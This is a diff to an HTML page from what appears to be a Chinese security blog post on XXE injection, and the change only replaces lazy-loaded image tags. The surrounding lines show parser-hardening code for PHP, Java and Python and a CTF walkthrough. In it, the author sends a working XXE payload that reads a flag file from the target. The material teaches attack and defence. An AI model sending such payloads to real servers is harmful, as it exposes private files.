@@ -166,7 +166,7 @@
 <h2 id="防御XXE"><a href="#防御XXE" class="headerlink" title="防御XXE"></a>防御XXE</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory <span class="attr">dbf</span> =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml <span class="built_in">import</span> etree</span><br><span class="line"><span class="attr">xmlData</span> = etree.parse(xmlSource,etree.XMLParser(<span class="attr">resolve_entities=False))</span></span><br></pre></td></tr></table></figure>
 <h2 id="CTF案例"><a href="#CTF案例" class="headerlink" title="CTF案例"></a>CTF案例</h2><p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a>平台上的一题 平台题目质量很高 没事的时候刷一刷还是很有趣的。</p>
 <p>题目提示:请设法获得目标机器<code>/home/ctf/flag.txt</code>中的flag值。</p>
-<p><img alt="QQ截图20190908172103.png" data-src="https://i.loli.net/2019/09/08/vabINWfqmXjgt35.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/08/vabINWfqmXjgt35.png" alt="QQ截图20190908172103.png"></p>
 <p>抓包发现</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/json</span><br></pre></td></tr></table></figure>
 <p>我们修改成</p>
@@ -174,7 +174,7 @@
 <p>经检测存在XXE</p>
 <p>XXE<code>payload</code>为</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE linux [&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img alt="QQ截图20190908173755.png" data-src="https://i.loli.net/2019/09/08/Li9uAx6oJHkgYOy.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/08/Li9uAx6oJHkgYOy.png" alt="QQ截图20190908173755.png"></p>
 
   </article>
 </div>
